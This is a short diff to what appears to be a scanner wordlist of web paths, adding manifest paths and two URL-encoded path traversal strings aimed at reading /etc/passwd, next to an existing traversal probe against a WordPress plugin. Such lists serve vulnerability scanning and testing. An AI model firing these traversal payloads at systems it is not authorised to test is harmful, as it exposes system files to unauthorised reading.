@@ -715,3 +715,7 @@
 /wp-content/plugins/wp-file-manager/readme.txt
 /wp-content/plugins/ioncube-tester-plus/readme.txt
 /wp-content/plugins/ioncube-tester-plus/loader-wizard.php?page=phpconfig&download=1&ininame=../../../../../../../../etc/passwd
+/manifest.webmanifest
+/manifest.json
+/api/file/temp/..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+/plugins/..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
